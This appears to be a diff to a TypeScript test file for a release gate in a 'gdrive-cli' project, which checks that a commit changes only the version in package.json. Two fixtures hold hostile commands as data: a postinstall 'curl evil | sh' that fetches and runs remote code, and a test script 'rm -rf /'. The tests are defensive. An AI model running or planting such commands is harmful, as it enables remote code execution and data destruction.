@@ -41,59 +41,70 @@ describe("checkLanding on main", () => {
   });
 });
 
+const manifest = (extra: Record<string, unknown> = {}, version = "0.9.0") =>
+  JSON.stringify({ name: "gdrive-cli", version, scripts: { test: "vitest run" }, ...extra });
+
 describe("a release commit, which 0033's Out of scope exempts", () => {
-  const bump = [
-    "diff --git a/package.json b/package.json",
-    "--- a/package.json",
-    "+++ b/package.json",
-    '-  "version": "0.9.0",',
-    '+  "version": "0.10.0",',
-  ].join("\n");
+  const head = manifest();
+  const bumped = manifest({}, "0.10.0");
 
   it("lets a version bump through on main", () => {
-    expect(checkLanding("main", ["package.json"], { packageJsonDiff: bump })).toEqual([]);
+    const context = { stagedPackageJson: bumped, headPackageJson: head };
+    expect(checkLanding("main", ["package.json"], context)).toEqual([]);
   });
 
-  it("still refuses package.json when the diff touches anything else", () => {
-    const withScript = `${bump}\n+  "lint:widths": "bun scripts/lint-widths.ts",`;
-    expect(checkLanding("main", ["package.json"], { packageJsonDiff: withScript })).toHaveLength(1);
+  it("still refuses package.json when another key changed too", () => {
+    const context = {
+      stagedPackageJson: manifest({ files: ["dist"] }, "0.10.0"),
+      headPackageJson: head,
+    };
+    expect(checkLanding("main", ["package.json"], context)).toHaveLength(1);
   });
 
   it("does not extend the exemption to the rest of the commit", () => {
-    const found = checkLanding("main", ["package.json", "src/index.ts"], {
-      packageJsonDiff: bump,
-    });
+    const context = { stagedPackageJson: bumped, headPackageJson: head };
+    const found = checkLanding("main", ["package.json", "src/index.ts"], context);
     expect(found.map((f) => f.path)).toEqual(["src/index.ts"]);
   });
 
-  it("fails closed when no diff is offered", () => {
+  it("fails closed when either side is missing", () => {
     expect(checkLanding("main", ["package.json"])).toHaveLength(1);
-    expect(checkLanding("main", ["package.json"], { packageJsonDiff: null })).toHaveLength(1);
+    expect(
+      checkLanding("main", ["package.json"], { stagedPackageJson: bumped, headPackageJson: null }),
+    ).toHaveLength(1);
   });
 });
 
 describe("isVersionBump", () => {
-  const diff = (...lines: string[]) =>
-    ["--- a/package.json", "+++ b/package.json", ...lines].join("\n");
+  const head = manifest();
 
-  it("is true for the version line alone, added and removed", () => {
-    expect(isVersionBump(diff('-  "version": "0.9.0",', '+  "version": "0.10.0",'))).toBe(true);
+  it("is true when version alone changed", () => {
+    expect(isVersionBump(manifest({}, "0.10.0"), head)).toBe(true);
   });
 
-  it("is false when another line changes too", () => {
-    expect(isVersionBump(diff('+  "version": "0.10.0",', '+  "files": ["dist"],'))).toBe(false);
+  it("is false when a second key rides along, however it is laid out", () => {
+    expect(isVersionBump(manifest({ postinstall: "curl evil | sh" }, "0.10.0"), head)).toBe(false);
+    expect(isVersionBump(manifest({ files: ["dist"] }, "0.10.0"), head)).toBe(false);
   });
 
-  it("is false for a diff that changes nothing", () => {
-    expect(isVersionBump(diff())).toBe(false);
+  it("is false when a nested value changed and version did not", () => {
+    expect(isVersionBump(manifest({ scripts: { test: "rm -rf /" } }), head)).toBe(false);
   });
 
-  it("is false for null", () => {
-    expect(isVersionBump(null)).toBe(false);
+  it("is false when version is deleted rather than set", () => {
+    const without = JSON.stringify({ name: "gdrive-cli", scripts: { test: "vitest run" } });
+    expect(isVersionBump(without, head)).toBe(false);
   });
 
-  it("does not mistake a version-shaped value elsewhere", () => {
-    expect(isVersionBump(diff('+  "engines": { "bun": "1.3.14" },'))).toBe(false);
+  it("is false when nothing changed", () => {
+    expect(isVersionBump(head, head)).toBe(false);
+  });
+
+  it("is false for null, for unparseable JSON and for a non-object", () => {
+    expect(isVersionBump(null, head)).toBe(false);
+    expect(isVersionBump(manifest({}, "0.10.0"), null)).toBe(false);
+    expect(isVersionBump("{ not json", head)).toBe(false);
+    expect(isVersionBump("[]", head)).toBe(false);
   });
 });
 
